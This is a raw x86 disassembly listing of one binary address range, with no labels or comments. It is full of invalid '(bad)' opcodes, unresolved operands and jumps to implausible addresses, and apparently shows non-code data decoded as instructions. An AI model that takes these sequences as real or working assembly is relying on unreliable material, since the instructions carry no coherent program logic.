  40f12b:	int    0xfa
  40f12d:	sub    BYTE PTR [edi],cl
  40f12f:	jg     0x40f14e
  40f131:	fild   DWORD PTR [eax+0x22]
  40f134:	add    eax,0x2ad7abb9
  40f139:	push   cs
  40f13a:	xchg   esi,eax
  40f13b:	sbb    al,0x1d
  40f13d:	jmp    0x9090a545
  40f142:	inc    eax
  40f143:	es inc esp
  40f145:	add    cl,ch
  40f147:	push   eax
  40f148:	mov    ?,WORD PTR [ecx+eiz*8+0x0]
	...
  40f158:	add    BYTE PTR [eax],al
  40f15a:	mov    eax,0xeee67c29
  40f15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f160:	nop
  40f161:	ss (bad) 
  40f163:	(bad)
  40f167:	add    eax,0x83bb6255
  40f16c:	ret    
  40f16d:	lds    edi,FWORD PTR [ecx]
  40f16f:	add    eax,0x18f7fc6a
  40f174:	or     cl,al
  40f176:	mov    dl,0x32
  40f178:	jmp    FWORD PTR [esi+0x13fc48d8]
  40f17e:	dec    ecx
  40f17f:	(bad)  
  40f180:	je     0x40f173
  40f182:	or     BYTE PTR [esi+edi*8-0x6a],bl
  40f186:	into   
  40f187:	sbb    esp,DWORD PTR [ebx]
  40f189:	mov    ds,WORD PTR [ebp+edi*8-0x19]
  40f18d:	dec    ecx
  40f18e:	into   
  40f18f:	mov    ?,esi
  40f191:	adc    ebx,DWORD PTR [ebx]
  40f193:	(bad)  
  40f194:	je     0x40f177
  40f196:	enter  0xfe77,0x6e
  40f19a:	test   BYTE PTR [esi+0x18ee6574],0x8
  40f1a1:	push   ecx
  40f1a2:	and    al,0x32
  40f1a4:	call   DWORD PTR [esi+0x28]
  40f1a7:	les    eax,FWORD PTR [ebx]
  40f1a9:	jmp    0x6b2c6beb
  40f1ae:	and    edx,DWORD PTR [esi+0x1b60d356]
  40f1b4:	ds ss fs std 
  40f1b8:	out    0xb9,eax
  40f1ba:	jl     0x40f14a
  40f1bc:	(bad)  
  40f1bd:	jo     0x40f1bf
	...
  40f1cb:	add    BYTE PTR [eax],al
  40f1cd:	test   BYTE PTR [ecx-0x22792376],dl
  40f1d3:	inc    eax
  40f1d4:	jmp    0x9540c0b9
  40f1d9:	outs   dx,DWORD PTR ds:[esi]
  40f1da:	sbb    eax,0x42f7004d
  40f1df:	add    BYTE PTR [edi+0x72],dl
  40f1e2:	sub    al,0x28
  40f1e4:	add    BYTE PTR [edx-0x5f8b4004],cl
  40f1ea:	loopne 0x40f1d3
  40f1ec:	ficomp WORD PTR [edx]
  40f1ee:	js     0x40f1ed
  40f1f0:	or     ecx,edx
  40f1f2:	std    
  40f1f3:	pop    ds
  40f1f4:	mov    DWORD PTR [edi+0x71],eax
  40f1f7:	data16 add BYTE PTR [edx+0x68],bh
  40f1fb:	mov    esp,0x40ce4468
  40f200:	add    BYTE PTR ds:0x97fff7fc,bl
  40f206:	stc    
  40f207:	out    0xc8,eax
  40f209:	xchg   ecx,eax
  40f20a:	jb     0x40f209
  40f20c:	jmp    DWORD PTR [edi+0x69]
  40f20f:	out    0xf1,al
  40f211:	je     0x40f285
  40f213:	std    
  40f214:	cld    
  40f215:	sbb    ecx,ecx
  40f217:	mov    bh,0xff
  40f219:	fnsave [ecx-0x3]
  40f21c:	repnz mov WORD PTR [eax+0x71a37505],?
  40f223:	jae    0x40f221
  40f225:	(bad)  
  40f226:	sti    
  40f227:	pop    es
  40f228:	call   0x3fc7a1
  40f22d:	sbb    eax,0x4c0c0
	...
  40f23e:	add    BYTE PTR [eax],al
  40f240:	or     bl,ah
  40f242:	mov    ch,ah
  40f244:	mov    DWORD PTR [edx+eiz*8+0x57],ecx
  40f248:	and    BYTE PTR [ecx],cl
  40f24a:	push   0x3f
  40f24c:	popf   
  40f24d:	sti    
  40f24e:	pop    es
  40f24f:	call   0x3fc776
  40f254:	inc    ebx
  40f255:	retf   
  40f256:	sti    
  40f257:	mov    edi,DWORD PTR [edi-0x45bed81e]
  40f25d:	mov    BYTE PTR ds:0x67c9d600,bh
  40f263:	pop    ebx
  40f264:	arpl   WORD PTR [ecx+0x41],bx
  40f267:	add    BYTE PTR [esi+eax*1],dl
  40f26a:	inc    eax
  40f26b:	sub    DWORD PTR [ebx-0x62],esp
  40f26e:	pop    es
  40f26f:	rcl    BYTE PTR [edi],0xb8
  40f272:	sub    ebp,eax
  40f274:	std    
  40f275:	jge    0x40f20a
  40f277:	(bad)  
  40f278:	pop    eax
  40f279:	fimul  WORD PTR [esi]
  40f27b:	and    dl,bl
  40f27d:	(bad)  [ebx-0x5e619c99]
  40f283:	mov    ebp,0x41493a0b
  40f288:	arpl   WORD PTR [ebx-0x369b07e8],di
  40f28e:	sti    
  40f28f:	out    0xb3,eax
  40f291:	inc    edi
  40f292:	xchg   ebx,eax
  40f293:	(bad)  
  40f294:	push   esp
  40f295:	leave  
  40f296:	mov    esp,edi
  40f298:	retf   0x92f4
  40f29b:	inc    BYTE PTR [edi-0x51]
  40f29e:	ret    0x3cb8
  40f2a1:	imul   edx,DWORD PTR [edx+0xfe],0x0
	...
  40f2b0:	add    BYTE PTR [eax],al
  40f2b2:	add    BYTE PTR [ecx],dh
  40f2b4:	inc    esp
  40f2b5:	int3   
  40f2b6:	push   es
  40f2b7:	mov    dh,0x35
  40f2b9:	sbb    al,0x0
  40f2bb:	arpl   WORD PTR [ebx+0x51],si
  40f2be:	addr16 xchg ecx,esp
  40f2c1:	inc    esp
  40f2c2:	add    BYTE PTR [ebx+0x634148d1],cl
  40f2c8:	sbb    ebx,DWORD PTR [ecx]
  40f2ca:	or     bl,bh
  40f2cc:	mov    bl,0xd
  40f2ce:	(bad)  
  40f2cf:	cld    
  40f2d0:	mov    bh,0x2
  40f2d2:	push   0x435986
  40f2d7:	jnp    0x40f2ef
  40f2d9:	dec    ecx
  40f2da:	inc    ecx
  40f2db:	arpl   WORD PTR [ebx-0x27],ax
  40f2de:	push   esp
  40f2df:	mov    bl,BYTE PTR [ebp+0x2]
  40f2e2:	call   0xfed26815
  40f2e7:	fisub  DWORD PTR [eax-0x62]
  40f2ea:	imul   esp,DWORD PTR [ebx+0x5],0x46260d91
  40f2f1:	jmp    0xa882ce11
  40f2f6:	add    ebp,DWORD PTR [ecx+edx*8+0x523dcb3]
  40f2fd:	adc    edi,ecx
  40f2ff:	cmp    ecx,DWORD PTR [ebp+edi*8-0x7d6ee084]
  40f306:	add    edi,ebx
  40f308:	and    BYTE PTR [ebx-0x7ee29cbc],0x48
  40f30f:	and    al,BYTE PTR ds:0xde0fd8de
  40f315:	daa    
  40f316:	add    al,0x0
	...
  40f324:	add    BYTE PTR [eax],al
  40f326:	jnp    0x40f30d
  40f328:	das    
  40f329:	xchg   ebx,eax
  40f32a:	gs jge 0x40f358
  40f32d:	xchg   esp,eax
  40f32e:	out    dx,eax
  40f32f:	inc    eax
  40f330:	lds    esi,FWORD PTR [ebx]
  40f332:	retf   
  40f333:	jp     0x40f360
  40f335:	inc    ebp
  40f336:	arpl   WORD PTR ds:0x5a24851,bx
  40f33c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f33d:	fcom   DWORD PTR [edi+0x4b0427dc]
  40f343:	add    DWORD PTR [eax],esi
  40f345:	xchg   ebx,eax
  40f346:	sub    eax,0xe19c237d
  40f34b:	or     BYTE PTR [ebp+0x3],bh
  40f34e:	xchg   edi,eax
  40f34f:	cmp    eax,0x613106a
  40f354:	std    
  40f355:	inc    ebp
  40f356:	loopne 0x40f360
  40f358:	jge    0x40f35d
  40f35a:	(bad)
  40f35e:	arpl   WORD PTR [edx-0x2906d62],bx
  40f364:	inc    eax
  40f365:	aaa    
  40f366:	xchg   ecx,eax
  40f367:	mov    cl,BYTE PTR [ebp-0x6e]
  40f36a:	outs   dx,DWORD PTR ds:[esi]
  40f36b:	xchg   ecx,eax
  40f36c:	inc    ebp
  40f36d:	sbb    BYTE PTR [ebx-0x63],ch
  40f370:	xchg   ecx,eax
  40f371:	xor    eax,0x35ff8ad4
  40f376:	imul   edx,DWORD PTR [ebp-0x5d374b02],0xffffff9f
  40f37d:	mov    ebx,0x94fe8bd1
  40f382:	aam    0x8b
  40f384:	je     0x40f367
  40f386:	enter  0x5171,0xe
	...
  40f396:	add    BYTE PTR [eax],al
  40f398:	add    cl,dl
  40f39a:	mov    esi,DWORD PTR [ebp+ecx*1-0xf]
  40f39e:	adc    eax,ebp
  40f3a0:	(bad)  
  40f3a1:	ins    BYTE PTR es:[edi],dx
  40f3a2:	std    
  40f3a3:	out    0x92,eax
  40f3a5:	push   esi
  40f3a6:	mov    bh,dh
  40f3a8:	out    dx,al
  40f3a9:	ins    BYTE PTR es:[edi],dx
  40f3aa:	cdq    
  40f3ab:	out    0x7d,eax
  40f3ad:	xor    al,0x8a
  40f3af:	(bad)  
  40f3b0:	fimul  WORD PTR [ecx+edx*4-0x19]
  40f3b4:	gs xor al,0x8a
  40f3b7:	dec    dh
  40f3b9:	dec    esp
  40f3ba:	xchg   ebp,eax
  40f3bb:	out    0x6d,eax
  40f3bd:	xchg   esp,eax
  40f3be:	mov    bh,dh
  40f3c0:	mov    esi,0x35e79d6c
  40f3c5:	xchg   esp,eax
  40f3c6:	mov    bh,dh
  40f3c8:	scas   al,BYTE PTR es:[edi]
  40f3c9:	ins    BYTE PTR es:[edi],dx
  40f3ca:	mov    esi,edi
  40f3cc:	sbb    al,0x3f
  40f3ce:	mov    ds:0x8ad23bee,al
  40f3d3:	pop    esi
  40f3d4:	mov    al,ds:0x34000625
  40f3d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3da:	sahf   
  40f3db:	sub    BYTE PTR [ebp+0x13001bf3],0x9f
  40f3e2:	mov    dh,BYTE PTR [ecx+eiz*8-0x18]
  40f3e6:	jae    0x40f439
  40f3e8:	outs   dx,BYTE PTR ds:[esi]
  40f3e9:	bnd jl 0x40f430
  40f3ec:	gs pop ebp
  40f3ee:	add    eax,0xb958e96a
  40f3f3:	inc    esp
  40f3f4:	test   al,0x60
  40f3f6:	sbb    eax,0x8560e900
  40f3fb:	out    0x0,eax
	...
  40f409:	add    BYTE PTR [eax],al
  40f40b:	add    BYTE PTR [esi],al
  40f40d:	fdivp  st(6),st
  40f40f:	call   ecx
  40f411:	lds    esi,FWORD PTR [edx+0x23]
  40f414:	jmp    0x974:0x755f016d
  40f41b:	rcr    dh,0x9e
  40f41e:	dec    esi
  40f41f:	push   0xbeef05ca
  40f424:	loop   0x40f3e2
  40f426:	inc    ebx
  40f427:	inc    ecx
  40f428:	mov    edx,0x9275fed5
  40f42d:	ins    DWORD PTR es:[edi],dx
  40f42e:	out    dx,eax
  40f42f:	jns    0x40f3c6
  40f431:	je     0x40f419
  40f433:	sbb    eax,0xfffd74ef
  40f438:	(bad)  
  40f43a:	std    
  40f43b:	jne    0x40f4af
  40f43d:	ins    DWORD PTR es:[edi],dx
  40f43e:	mov    ss,WORD PTR [edx-0x6b]
  40f441:	je     0x40f40a
  40f443:	ret    0x57e
  40f446:	push   ebp
  40f447:	mov    esp,DWORD PTR [esi+0x7dfcc280]
  40f44d:	out    0xff,eax
  40f44f:	imul   ecx,DWORD PTR [ebx+0x22087376],0xf5ff50b2
  40f459:	or     eax,DWORD PTR [esp+edi*8-0x4f]
  40f45d:	mov    bh,0x6c
  40f45f:	sub    BYTE PTR [ebx+0x3a3f8001],cl
  40f465:	icebp  
  40f466:	aas    
  40f467:	push   0x413fe0
  40f46c:	jge    0x40f4d7
  40f46e:	jl     0x40f497
	...
  40f47c:	add    BYTE PTR [eax],al
  40f47e:	add    BYTE PTR [edx],cl
  40f480:	add    eax,0xa20ec00b
  40f485:	push   ebp
  40f486:	call   0x3fcb26
  40f48b:	icebp  
  40f48c:	les    esi,FWORD PTR [edx+0x19]
  40f48f:	mov    edx,0x63ffffec
  40f494:	aas    
  40f495:	push   ecx
  40f496:	addr16 repz popa 
  40f499:	inc    ecx
  40f49a:	add    BYTE PTR [ebx],dh
  40f49c:	aas    
  40f49d:	push   ss
  40f49e:	or     bl,cl
  40f4a0:	pop    ss
  40f4a1:	or     bh,bh
  40f4a3:	int3   
  40f4a4:	inc    esi
  40f4a5:	dec    esp
  40f4a6:	push   ebx
  40f4a7:	(bad)  
  40f4a8:	xlat   BYTE PTR ds:[ebx]
  40f4a9:	mov    ?,WORD PTR [edx]
  40f4ab:	mov    ds:0xb4fe9025,eax
  40f4b0:	out    0x94,eax
  40f4b2:	lods   eax,DWORD PTR ds:[esi]
  40f4b3:	imul   edx,DWORD PTR [edi+0x71a4c015],0xffffff8e
  40f4ba:	(bad)  
  40f4bb:	push   ss
  40f4bc:	xchg   esi,eax
  40f4bd:	call   0x9a5e:0x8e87311f
  40f4c4:	fadd   QWORD PTR [esi]
  40f4c6:	add    BYTE PTR [esi],ch
  40f4c8:	and    ebx,DWORD PTR [edi+0x36a2a782]
  40f4ce:	push   0x63
  40f4d0:	xor    al,0x42
  40f4d2:	push   esi
  40f4d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4d5:	call   0xa688:0x8eb712c1
  40f4dc:	ret    0x3c7a
  40f4df:	(bad)
	...
  40f4f2:	jecxz  0x40f482
  40f4f4:	add    dh,BYTE PTR [ebx+eiz*4+0x46]
  40f4f8:	add    al,0x46
  40f4fa:	mov    ds:0x66e8359e,al
  40f4ff:	mov    edi,0x5e580002
  40f504:	pop    ss
  40f505:	and    ecx,DWORD PTR [esi+eax*4+0x7f1c5dd3]
  40f50c:	cli    
  40f50d:	mov    edi,0x6832a58f
  40f512:	arpl   WORD PTR [esi-0x60844263],bx
  40f518:	inc    esp
  40f519:	inc    ecx
  40f51a:	arpl   WORD PTR ds:0xfd6f8eb9,ax
  40f520:	push   eax
  40f521:	out    dx,al
  40f522:	imul   ecx,DWORD PTR [eax+0x319a9c55],0x4e
  40f529:	(bad)  
  40f52a:	fcom   st(3)
  40f52c:	sub    BYTE PTR [ebp-0x2b],cl
  40f52f:	xchg   DWORD PTR ds:0xf056d28f,edi
  40f535:	push   es
  40f536:	dec    esi
  40f537:	(bad)
  40f53a:	les    eax,FWORD PTR [eax-0x44a7140]
  40f540:	sub    BYTE PTR [eax],bl
  40f542:	xchg   DWORD PTR ds:0x52245f8,ebx
  40f548:	mov    ecx,0x62d7b9b
  40f54d:	(bad)  
  40f54e:	and    al,0x1d
  40f550:	jmp    0x80877158
  40f555:	push   es
	...
  40f562:	add    BYTE PTR [eax],al
  40f564:	add    BYTE PTR ds:0x7c33e946,bl
  40f56a:	adc    ecx,esi
  40f56c:	fwait
  40f56d:	or     DWORD PTR [esi+ebx*8],0xffffff8e
  40f571:	test   cl,bh
  40f573:	cmp    al,0x8f
  40f575:	sbb    cl,BYTE PTR gs:[edx]
  40f578:	pushf  
  40f579:	mov    bh,0x2d
  40f57b:	(bad)  
  40f57c:	mov    gs,WORD PTR [ecx-0x3b]
  40f57f:	xor    al,0xe8
  40f581:	(bad)  
  40f582:	in     al,dx
  40f583:	cs inc ebp
  40f585:	arpl   WORD PTR ds:0x869599c1,si
  40f58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f58c:	xor    ecx,ebx
  40f58e:	add    eax,0x1dee9ee9
  40f593:	out    dx,al
  40f594:	inc    ebp
  40f595:	mov    ds:0x978f3905,al
  40f59a:	std    
  40f59b:	nop
  40f59c:	push   ecx
  40f59d:	mov    WORD PTR [esi+0x332e9b7d],es
  40f5a3:	add    BYTE PTR [esi-0x2b],dh
  40f5a6:	xchg   DWORD PTR [ebp+ebp*2-0x13],esi
  40f5aa:	adc    DWORD PTR [eax],ecx
  40f5ac:	push   ecx
  40f5ad:	das    
  40f5ae:	xor    al,0xff
  40f5b0:	pop    esi
  40f5b1:	cmp    eax,0x60edc1bc
  40f5b6:	xor    BYTE PTR [ebx-0x103d1ec3],cl
  40f5bc:	je     0x40f5e9
  40f5be:	xchg   ebp,eax
  40f5bf:	dec    edi
  40f5c0:	ds imul edi,ecx,0xffffffe7
  40f5c4:	sahf   
  40f5c5:	ja     0x40f54d
  40f5c7:	(bad)  
  40f5c8:	loop   0x40f5ca
	...
  40f5d6:	add    BYTE PTR [eax],al
  40f5d8:	mov    al,ds:0x536a3212
  40f5dd:	mov    DWORD PTR [ecx],eax
  40f5df:	xchg   edi,eax
  40f5e0:	sar    DWORD PTR [ebx+0x44],0x11
  40f5e4:	jle    0x40f56a
  40f5e6:	aaa    
  40f5e7:	mov    ebp,0x6191182
  40f5ec:	jnp    0x40f5e3
  40f5ee:	(bad)  
  40f5ef:	je     0x40f579
  40f5f1:	sahf   
  40f5f2:	and    eax,0xfe87d599
  40f5f7:	je     0x40f5e5
  40f5f9:	xchg   DWORD PTR [ecx+eiz*8-0x1a],esi
  40f5fd:	adc    DWORD PTR [eax],ecx
  40f5ff:	shr    DWORD PTR ds:0xe4d6ff35,1
  40f605:	inc    eax
  40f606:	lock cmp edi,edi
  40f609:	push   eax
  40f60a:	pop    eax
  40f60b:	(bad)  
  40f60c:	out    0xbc,al
  40f60e:	shr    ebp,0x60
  40f611:	xor    BYTE PTR [ebx-0x83e1d3b],cl
  40f617:	inc    ebx
  40f618:	sbb    eax,DWORD PTR [bp+di-0x5a]
  40f61c:	dec    esp
  40f61d:	std    
  40f61e:	out    0x51,eax
  40f620:	ja     0x40f5a8
  40f622:	(bad)  
  40f623:	pusha  
  40f624:	pushf  
  40f625:	mov    DWORD PTR [ecx-0x17],ebp
  40f628:	jp     0x40f62f
  40f62a:	push   0x41402500
  40f62f:	add    BYTE PTR [edx+0x3],dh
  40f632:	add    BYTE PTR [eax],al
  40f634:	jp     0x40f69f
  40f636:	jo     0x40f68e
  40f638:	lea    edi,[eax+0x9]
  40f63b:	rol    BYTE PTR [eax],0x0
	...
  40f64a:	add    BYTE PTR [esi],dl
  40f64c:	mov    ecx,0xe9824587
  40f651:	jb     0x40f699
  40f653:	mov    ebx,0x3275ff01
  40f658:	imul   esp,eax,0xb01ca25
  40f65e:	rcl    BYTE PTR [esi],0xa5
  40f661:	std    
  40f662:	jne    0x40f5f6
  40f664:	imul   eax,DWORD PTR [ecx],0x4e788d5d
  40f66a:	push   0x3ebd68
  40f66f:	rol    BYTE PTR [ecx],cl
  40f671:	add    bh,ch
  40f673:	or     al,0xeb
  40f675:	dec    DWORD PTR [edi+0x6d]
  40f678:	out    dx,al
  40f679:	pop    es
  40f67a:	call   0x3fe651
  40f67f:	jb     0x40f619
  40f681:	push   ecx
  40f682:	dec    DWORD PTR [ebp+0x62f87378]
  40f688:	nop
  40f689:	push   ecx
  40f68a:	(bad)  
  40f68b:	jge    0x40f705
  40f68d:	jae    0x40f68b
  40f68f:	(bad)  
  40f690:	out    dx,al
  40f691:	pop    es
  40f692:	call   0x3fc897
  40f697:	add    eax,DWORD PTR [edi+0x2]
  40f69a:	add    BYTE PTR [edi-0x2],dh
  40f69d:	jmp    0xa000:0x68950683
  40f6a4:	int    0xfe
  40f6a6:	jne    0x40f6ea
  40f6a8:	mov    eax,ds:0x91fd502c
  40f6ad:	xchg   DWORD PTR [ebp+0x0],eax
	...
  40f6bc:	add    BYTE PTR [eax],al
  40f6be:	into   
  40f6bf:	and    BYTE PTR [eax],al
  40f6c1:	add    BYTE PTR [ebx-0x75],ah
  40f6c4:	dec    esp
  40f6c5:	addr16 in eax,0x2c
  40f6c8:	inc    ebx
  40f6c9:	add    BYTE PTR [ebx+0x63414607],cl
  40f6cf:	add    edx,DWORD PTR [esi]
  40f6d1:	or     bl,bh
  40f6d3:	add    al,0x14
  40f6d5:	(bad)  
  40f6d6:	cld    
  40f6d7:	repz adc eax,0xfa61f4fc
  40f6dd:	out    0x9c,eax
  40f6df:	mov    esi,0x311afe8b
  40f6e4:	pop    es
  40f6e5:	add    BYTE PTR [esi],dh
  40f6e7:	out    0x9e,eax
  40f6e9:	sbb    BYTE PTR [edi+0x63001ac6],0xd3
  40f6f0:	dec    esp
  40f6f1:	dec    BYTE PTR [esi+0x66]
  40f6f4:	call   0x2efe:0x8c332c42
  40f6fb:	jp     0x40f688
  40f6fd:	je     0x40f75a
  40f6ff:	push   ss
  40f700:	imul   ecx,DWORD PTR [esi-0x5c],0x73748c1b
  40f707:	adc    edx,DWORD PTR [esi]
  40f709:	or     BYTE PTR [ebx-0x7300c405],cl
  40f70f:	adc    DWORD PTR [eax+ebx*1],0xffffff84
  40f713:	add    edi,esi
  40f715:	(bad)  
  40f716:	mul    BYTE PTR [ebp-0x66]
  40f719:	push   esp
  40f71a:	and    al,0x6b
  40f71c:	mov    ah,BYTE PTR [edi-0x5a]
  40f71f:	sub    al,0x45
	...
  40f731:	fs loope 0x40f727
  40f734:	out    0x86,eax
  40f736:	or     DWORD PTR [eax+eax*1],eax
  40f739:	push   0xbb6510ae
  40f73e:	stos   DWORD PTR es:[edi],eax
  40f73f:	inc    ecx
  40f740:	inc    ecx
  40f741:	arpl   WORD PTR [esi+0xa],ax
  40f744:	and    esp,DWORD PTR [ebx+0x6e]
  40f747:	jnp    0x40f78d
  40f749:	cmp    eax,DWORD PTR ds:0xc6a6c311
  40f74f:	call   0x8156a6de
  40f754:	add    eax,DWORD PTR [esi+0x5]
  40f757:	jmp    0xef39cc5a
  40f75c:	push   es
  40f75d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f75e:	jge    0x40f7cf
  40f760:	inc    ecx
  40f761:	jae    0x40f6e7
  40f763:	sti    
  40f764:	repz add al,0xa2
  40f767:	add    DWORD PTR [ebx-0x749f780b],ecx
  40f76d:	jo     0x40f7a8
  40f76f:	jo     0x40f7b2
  40f771:	out    0xec,eax
  40f773:	out    0x3,eax
  40f775:	int3   
  40f776:	ret    0x114d
  40f779:	imul   ebp,DWORD PTR [ebp+0x33],0x3a
  40f77d:	int3   
  40f77e:	cmp    DWORD PTR ds:0xbb845711,0xfffffffb
  40f785:	les    ebp,FWORD PTR [eax]
  40f787:	sahf   
  40f788:	mov    dh,BYTE PTR [ebp-0x5278647d]
  40f78e:	stc    
  40f78f:	lock fwait
  40f791:	in     eax,dx
  40f792:	rcl    BYTE PTR ds:0x8b,cl
	...
  40f7a4:	popf   
  40f7a5:	stc    
  40f7a6:	lock mov cl,BYTE PTR [edi]
  40f7a9:	sbb    DWORD PTR [esi],eax
  40f7ab:	adc    DWORD PTR [ebx+0x6d],ebx
  40f7ae:	sbb    eax,0x1f83843a
  40f7b3:	(bad)  
  40f7b4:	push   eax
  40f7b5:	add    eax,0x87887e94
  40f7ba:	lods   al,BYTE PTR ds:[esi]
  40f7bb:	mov    edx,DWORD PTR [esi]
  40f7bd:	mov    BYTE PTR [ebx],bl
  40f7bf:	ret    
  40f7c0:	ss (bad) 
  40f7c2:	call   0x6a42ceca
  40f7c7:	enter  0x3421,0x28
  40f7cb:	add    al,0x63
  40f7cd:	stc    
  40f7ce:	cmp    DWORD PTR [edi+0x3a87],eax
  40f7d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d5:	add    eax,0x4a553500
  40f7da:	inc    esp
  40f7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7dc:	pusha  
  40f7dd:	add    eax,0xca21e900
  40f7e2:	imul   ecx
  40f7e4:	pusha  
  40f7e5:	add    eax,0x81a35c00
  40f7ea:	dec    edi
  40f7eb:	je     0x40f790
  40f7ed:	jge    0x40f83e
  40f7ef:	adc    ebx,DWORD PTR [edi-0x13]
  40f7f2:	(bad)  
  40f7f3:	das    
  40f7f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7f5:	add    eax,0x311dd4ff
  40f7fa:	inc    ecx
  40f7fb:	jmp    0xaab4baed
  40f800:	fld    QWORD PTR [ecx]
  40f802:	clc    
  40f803:	jmp    0xccc43874
	...
  40f814:	add    BYTE PTR [eax],al
  40f816:	add    ah,bl
  40f818:	xor    BYTE PTR [edx-0x2],0x4d
  40f81c:	stc    
  40f81d:	sti    
  40f81e:	push   edx
  40f81f:	mov    edx,0xe9ff8ad8
  40f824:	clc    
  40f825:	pop    ss
  40f826:	cs push edx
  40f828:	and    edi,edi
  40f82a:	lahf   
  40f82b:	test   al,0x83
  40f82d:	jne    0x40f808
  40f82f:	fyl2xp1 
  40f831:	pop    es
  40f832:	add    edx,ecx
  40f834:	cmp    dh,0xe
  40f837:	dec    edx
  40f838:	or     BYTE PTR [ecx+eax*1-0x1b],0x48
  40f83d:	add    ebp,DWORD PTR [edx+0x5b]
  40f840:	jge    0x40f841
  40f842:	jl     0x40f8a7
  40f844:	xchg   BYTE PTR ds:0xfe5a53e9,bh
  40f84a:	pop    esp
  40f84b:	fild   DWORD PTR [ebx-0x3a7659ec]
  40f851:	push   DWORD PTR [esi]
  40f853:	sbb    BYTE PTR [ebx+eax*1-0x17],al
  40f857:	test   DWORD PTR [esi+0x45b900eb],ecx
  40f85d:	repnz push ebx
  40f85f:	std    
  40f860:	inc    ecx
  40f861:	clc    
  40f862:	add    BYTE PTR [edx+0x6],cl
  40f865:	add    bh,al
  40f867:	jg     0x40f7fe
  40f869:	(bad)  
  40f86a:	(bad)  
  40f86b:	cmp    al,BYTE PTR [esi]
  40f86d:	push   DWORD PTR [ebp+0x2a]
  40f870:	std    
  40f871:	inc    ebx
  40f872:	cld    
  40f873:	fistp  DWORD PTR [ecx]
  40f875:	cld    
  40f876:	push   0xa
  40f878:	and    BYTE PTR [eax],al
  40f87a:	push   0x0
	...
  40f888:	add    BYTE PTR [eax],al
  40f88a:	cli    
  40f88b:	pop    ds
  40f88c:	add    bh,bh
  40f88e:	jp     0x20476e91
  40f894:	add    BYTE PTR [edx+0xa],ch
  40f897:	sahf   
  40f898:	retf   0xfa22
  40f89b:	add    eax,0x530ec00b
  40f8a0:	dec    esi
  40f8a1:	push   eax
  40f8a2:	and    ch,BYTE PTR [ebx]
  40f8a4:	push   ecx
  40f8a5:	jmp    DWORD PTR ds:0x3f843fe
  40f8ab:	and    BYTE PTR [eax],al
  40f8ad:	push   0xffffffba
  40f8af:	push   DWORD PTR ss:[ebp+0x72]
  40f8b3:	mov    WORD PTR [ebx-0x4],?
  40f8b6:	test   DWORD PTR [edx],edx
  40f8b8:	or     al,0x6a
  40f8ba:	mov    edx,0x1ce8001f
  40f8bf:	imul   edi,esi,0xffffffff
  40f8c2:	add    DWORD PTR [ebp+0x73],0xf812650f
  40f8c9:	call   0x402f6c
  40f8ce:	cmp    eax,0x8a00f842
  40f8d3:	add    eax,0x8e078300
  40f8d8:	(bad)  
  40f8d9:	jae    0x40f90f
  40f8db:	mov    WORD PTR [ebx+0x8],?
  40f8de:	test   DWORD PTR [edx],edx
  40f8e0:	clc    
  40f8e1:	call   0x247f49
  40f8e6:	push   esp
  40f8e7:	fs ret 0x8c73
  40f8eb:	push   ds
  40f8ec:	mov    DWORD PTR [eax+eax*1+0x0],esi
	...
  40f8fc:	add    BYTE PTR [ebx+0x56],bl
  40f8ff:	add    esp,DWORD PTR [edx]
  40f901:	arpl   WORD PTR [esi+0x29],bp
  40f904:	add    esp,DWORD PTR [edx]
  40f906:	in     al,0xaa
  40f908:	jmp    0x4aae:0xccaee79
  40f90f:	sar    bh,0x1c
  40f912:	cmp    al,0x9c
  40f914:	in     eax,dx
  40f915:	inc    edx
  40f916:	outs   dx,BYTE PTR ds:[esi]
  40f917:	add    cl,BYTE PTR [ebx]
  40f919:	and    eax,DWORD PTR [ebx-0x694cb013]
  40f91f:	nop
  40f920:	dec    edi
  40f921:	cld    
  40f922:	idiv   DWORD PTR [ecx+0x44]
  40f925:	out    dx,eax
  40f926:	adc    eax,0xe276ff33
  40f92b:	xor    ebp,eax
  40f92d:	inc    esp
  40f92e:	mov    ebp,0x70c8fe87
  40f933:	inc    edx
  40f934:	sbb    BYTE PTR [ebx-0x332ef292],0xc1
  40f93b:	mov    ah,bh
  40f93d:	mov    ds:0xe8fe879e,al
  40f942:	mov    cl,0x8e
  40f944:	pop    edx
  40f945:	stos   BYTE PTR es:[edi],al
  40f946:	sub    al,0xf7
  40f948:	call   DWORD PTR [edi]
  40f94a:	repz xchg esi,eax
  40f94c:	sbb    BYTE PTR [edi-0x1fa8cec6],0x59
  40f953:	iret   
  40f954:	sub    BYTE PTR [edx],ah
  40f956:	outs   dx,BYTE PTR ds:[esi]
  40f957:	add    dh,BYTE PTR [ebp+0x65]
  40f95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f95b:	sub    cl,cl
  40f95d:	mov    eax,ds:0x8d0272
	...
  40f96e:	add    BYTE PTR [eax],al
  40f970:	es jle 0x40f9a4
  40f973:	(bad)  
  40f974:	out    dx,al
  40f975:	popa   
  40f976:	call   0x5987:0xe6051530
  40f97d:	inc    ebp
  40f97e:	in     eax,dx
  40f97f:	jg     0x40f910
  40f981:	push   es
  40f982:	jmp    0xcd42db8a
  40f987:	add    al,0x63
  40f989:	adc    eax,0x17e1f6e9
  40f98e:	call   0x3bc15c96
  40f993:	mov    BYTE PTR ds:0xe89cb0fa,dh
  40f999:	frstor [ebp-0x12baa679]
  40f99f:	and    BYTE PTR [eax+0x6],0xe9
  40f9a3:	add    edx,DWORD PTR [edx+edi*8]
  40f9a6:	mov    WORD PTR [edi+0x5d107d97],es
  40f9ac:	sahf   
  40f9ad:	(bad)  
  40f9ae:	call   0x75c00b4e
  40f9b3:	xchg   ebx,ebp
  40f9b5:	leave  
  40f9b6:	jl     0x40f93f
  40f9b8:	ja     0x40f93b
  40f9ba:	gs adc ebx,ebp
  40f9bd:	in     al,dx
  40f9be:	cmp    BYTE PTR [esi],0x22
  40f9c1:	add    eax,0x7fd6c441
  40f9c6:	dec    ebp
  40f9c7:	jge    0x40f9f0
